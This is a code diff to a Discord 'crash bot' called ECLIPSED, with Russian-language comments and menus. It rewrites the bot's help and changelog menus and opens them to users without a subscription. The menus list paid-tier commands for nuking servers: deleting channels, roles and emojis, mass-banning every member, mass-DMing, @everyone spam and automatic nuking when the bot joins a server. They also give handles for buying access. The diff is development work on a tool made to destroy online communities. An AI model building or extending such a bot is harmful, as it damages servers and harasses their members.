@@ -801,7 +801,6 @@ bot.remove_command("help")
 
 
 @bot.command(name="changelog")
-@wl_check()
 async def changelog(ctx):
     embed = discord.Embed(
         title="📋 CHANGELOG — ECLIPSED BOT",
@@ -872,8 +871,13 @@ async def changelog(ctx):
 
 
 @bot.command(name="help")
-@wl_check()
 async def help_cmd(ctx):
+    # Определяем уровень доступа пользователя
+    uid = ctx.author.id
+    is_owner = (uid == config.OWNER_ID)
+    is_prem = is_premium(uid)
+    is_wl = is_whitelisted(uid)
+
     embed = discord.Embed(
         title="☠️ ECLIPSED — CRASH BOT",
         description=(
@@ -884,22 +888,95 @@ async def help_cmd(ctx):
             " ██║     ██╔══██╗██╔══██║╚════██║██╔══██║\n"
             " ╚██████╗██║  ██║██║  ██║███████║██║  ██║\n"
             "  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n"
-            "```\n"
-            "> ⚠️ Если бот не реагирует — сервер заблокирован овнером."
+            "```"
         ),
         color=0x0a0a0a
     )
+
+    # Уровень доступа
+    if is_owner:
+        access_str = "👑 **OWNER** — полный доступ ко всем командам"
+    elif is_prem:
+        access_str = "💎 **PREMIUM** — доступ к расширенным командам"
+    elif is_wl:
+        access_str = "✅ **Обычная подписка** — базовые команды доступны"
+    else:
+        access_str = "❌ **Нет подписки** — доступ к командам закрыт"
+
+    embed.add_field(name="🔑 Твой уровень доступа", value=access_str, inline=False)
+
+    # Команды доступные ВСЕМ (без подписки)
     embed.add_field(
-        name="📋 СПИСОК КОМАНД",
+        name="📋 ДОСТУПНО ВСЕМ",
         value=(
-            "`!commands_user` — команды обычного пользователя\n"
-            "`!commands_premium` — команды Premium пользователя 💎\n"
-            "`!commands_owner` — команды овнера 👑\n"
-            "`!changelog` — история обновлений"
+            "`!help` — это меню\n"
+            "`!changelog` — история обновлений бота"
         ),
         inline=False
     )
-    embed.set_footer(text="☠️ Нет доступа? Пиши: davaidkatt  |  ECLIPSED SQUAD")
+
+    # Команды для обычной подписки
+    embed.add_field(
+        name="✅ ОБЫЧНАЯ ПОДПИСКА",
+        value=(
+            "`!nuke` — снести каналы/роли, создать новые, заспамить\n"
+            "`!stop` — остановить краш\n"
+            "`!cleanup` — снести всё, оставить один канал\n"
+            "`!addch [кол-во]` — создать каналы\n"
+            "`!rename [название]` — переименовать все каналы\n"
+            "`!invs_delete` — уничтожить все инвайты\n"
+            "`!nicks_all [ник]` — сменить ники всем\n"
+            "`!webhooks` — список вебхуков\n"
+            "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
+            "`!inv` — ссылка для добавления бота\n"
+            "`/sp [кол-во] [текст]` — спам\n"
+            "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой"
+        ),
+        inline=False
+    )
+
+    # Команды для Premium
+    embed.add_field(
+        name="💎 PREMIUM",
+        value=(
+            "`!nuke [текст]` — нюк со своим текстом\n"
+            "`!massban` — забанить всех участников\n"
+            "`!massdm [текст]` — разослать ДМ всем\n"
+            "`!spam [кол-во] [текст]` — спам в канал\n"
+            "`!pingspam [кол-во]` — спам @everyone\n"
+            "`!rolesdelete` — удалить все роли\n"
+            "`!emojisnuke` — удалить все эмодзи\n"
+            "`!serverinfo` — подробная инфа о сервере\n"
+            "`!userinfo [id]` — инфа о пользователе\n"
+            "`!auto_super_nuke on/off/text/info` — авто нюк+бан+роли+пинг при входе"
+        ),
+        inline=False
+    )
+
+    # Команды для Owner
+    embed.add_field(
+        name="👑 OWNER",
+        value=(
+            "`!wl_add/remove/list` — управление подписчиками\n"
+            "`!pm_add/remove/list` — управление Premium\n"
+            "`!block_guild / !unblock_guild` — блокировка серверов\n"
+            "`!blocked_guilds` — список заблокированных\n"
+            "`!set_spam_text / !get_spam_text` — текст нюка\n"
+            "`!owl_add/remove/list` — owner whitelist\n"
+            "`!guilds / !setguild / !invlink` — управление серверами в ЛС"
+        ),
+        inline=False
+    )
+
+    embed.add_field(
+        name="💬 Купить подписку",
+        value=(
+            "Discord: **davaidkatt**\n"
+            "Telegram: **@Firisotik**"
+        ),
+        inline=False
+    )
+    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  !changelog — история обновлений")
     embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
     await ctx.send(embed=embed)
 
@@ -1403,11 +1480,16 @@ async def on_message(message):
         return
 
     # ── Управление через ЛС ──────────────────────────────────
-    if isinstance(message.channel, discord.DMChannel) and is_whitelisted(message.author.id):
+    if isinstance(message.channel, discord.DMChannel):
         content = message.content.strip()
 
-        # !help — показать help прямо в ЛС
+        # !help и !changelog — доступны ВСЕМ без вайтлиста
         if content == "!help":
+            uid = message.author.id
+            is_owner = (uid == config.OWNER_ID)
+            is_prem = is_premium(uid)
+            is_wl = is_whitelisted(uid)
+
             embed = discord.Embed(
                 title="☠️ ECLIPSED — CRASH BOT",
                 description=(
@@ -1418,57 +1500,74 @@ async def on_message(message):
                     " ██║     ██╔══██╗██╔══██║╚════██║██╔══██║\n"
                     " ╚██████╗██║  ██║██║  ██║███████║██║  ██║\n"
                     "  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n"
-                    "```\n"
-                    "> ⚠️ Если бот не реагирует на сервере — он там заблокирован."
+                    "```"
                 ),
                 color=0x0a0a0a
             )
+            if is_owner:
+                access_str = "� **OWNER** — полный доступ ко всем командам"
+            elif is_prem:
+                access_str = "💎 **PREMIUM** — доступ к расширенным командам"
+            elif is_wl:
+                access_str = "✅ **Обычная подписка** — базовые команды доступны"
+            else:
+                access_str = "❌ **Нет подписки** — доступ к командам закрыт"
+
+            embed.add_field(name="🔑 Твой уровень доступа", value=access_str, inline=False)
             embed.add_field(
-                name="💀 УНИЧТОЖЕНИЕ",
+                name="📋 ДОСТУПНО ВСЕМ",
+                value="`!help` — это меню\n`!changelog` — история обновлений бота",
+                inline=False
+            )
+            embed.add_field(
+                name="✅ ОБЫЧНАЯ ПОДПИСКА",
                 value=(
-                    "`!nuke` — снести каналы/роли, создать новые, заспамить\n"
-                    "`!nuke [текст]` — то же самое со своим текстом 💎 **Premium**\n"
-                    "`!stop` — остановить краш\n"
-                    "`!cleanup` — снести всё, оставить один канал\n"
-                    "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
-                    "`!addch [кол-во]` — создать каналы"
+                    "`!nuke` · `!stop` · `!cleanup` · `!addch`\n"
+                    "`!rename` · `!invs_delete` · `!nicks_all`\n"
+                    "`!webhooks` · `!auto_nuke on/off/info` · `!inv`\n"
+                    "`/sp [кол-во] [текст]` · `/spkd [задержка] [кол-во] [текст]`"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="⚡ КОНТРОЛЬ",
+                name="� PREMIUM",
                 value=(
-                    "`!rename [название]` — переименовать все каналы\n"
-                    "`!nsfw_all` — включить NSFW везде\n"
-                    "`!unnsfw_all` — выключить NSFW\n"
-                    "`!invs_delete` — уничтожить все инвайты\n"
-                    "`!nicks_all [ник]` — сменить ники всем"
+                    "`!nuke [текст]` — нюк со своим текстом\n"
+                    "`!massban` · `!massdm` · `!spam` · `!pingspam`\n"
+                    "`!rolesdelete` · `!emojisnuke`\n"
+                    "`!serverinfo` · `!userinfo`\n"
+                    "`!auto_super_nuke on/off/text/info`"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="🔱 ИНСТРУМЕНТЫ",
+                name="� OWNER",
                 value=(
-                    "`!webhooks` — список вебхуков\n"
-                    "`!ip [адрес]` — пробить IP\n"
-                    "`!inv` — ссылка для добавления бота\n"
-                    "`/sp [кол-во] [текст]` — спам\n"
-                    "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой"
+                    "`!wl_add/remove/list` · `!pm_add/remove/list`\n"
+                    "`!block_guild / !unblock_guild / !blocked_guilds`\n"
+                    "`!set_spam_text / !get_spam_text`\n"
+                    "`!owl_add/remove/list`\n"
+                    "`!guilds / !setguild / !invlink` (в ЛС)"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="👁️ ДОСТУП",
-                value=(
-                    "`!wl_add [id]` — выдать доступ\n"
-                    "`!wl_remove [id]` — забрать доступ\n"
-                    "`!wl_list` — список допущенных"
-                ),
+                name="💬 Купить подписку",
+                value="Discord: **davaidkatt**\nTelegram: **@Firisotik**",
                 inline=False
             )
-            embed.set_footer(text="☠️ Нет доступа? Пиши: davaidkatt  |  💎 Premium = кастомный текст нюка")
+            embed.set_footer(text="☠️ ECLIPSED SQUAD  |  !changelog — история обновлений")
             embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
             await message.channel.send(embed=embed)
+            return
+
+        if content == "!changelog":
+            ctx = await bot.get_context(message)
+            await changelog(ctx)
+            return
+
+        # Всё остальное — только для вайтлиста
+        if not is_whitelisted(message.author.id):
             return
 
         # !owner_help — список всех ЛС-команд (только OWNER_ID)
@@ -1816,7 +1915,7 @@ async def on_message(message):
         # Любая другая команда — выполняем на активном сервере
         # Служебные ЛС-команды никогда не отправляются на сервер
         DM_ONLY_COMMANDS = (
-            "!help", "!owner_help", "!guilds", "!invlink",
+            "!help", "!changelog", "!owner_help", "!guilds", "!invlink",
             "!owl_add", "!owl_remove", "!owl_list",
             "!setguild", "!block_guild", "!unblock_guild", "!blocked_guilds",
             "!pm_add", "!pm_remove", "!pm_list",
